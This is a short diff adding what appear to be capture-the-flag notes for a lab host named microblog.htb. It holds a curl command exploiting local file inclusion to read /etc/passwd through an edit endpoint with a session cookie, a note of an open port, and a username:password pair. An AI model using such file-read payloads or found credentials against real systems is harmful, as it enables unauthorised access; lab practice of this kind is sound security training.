@@ -1,0 +1,7 @@
+LFI: 
+
+$ curl -s "http://fady.microblog.htb/edit/index.php" -H "Cookie: username=58neigalqtetis4soiudj2lva3" -d 'id=/etc/passwd' -d 'txt=dfsdfsdfs' | grep "const html" > input.txt 
+
+
+port 9000 active
+cooper:zooperdoopercooper
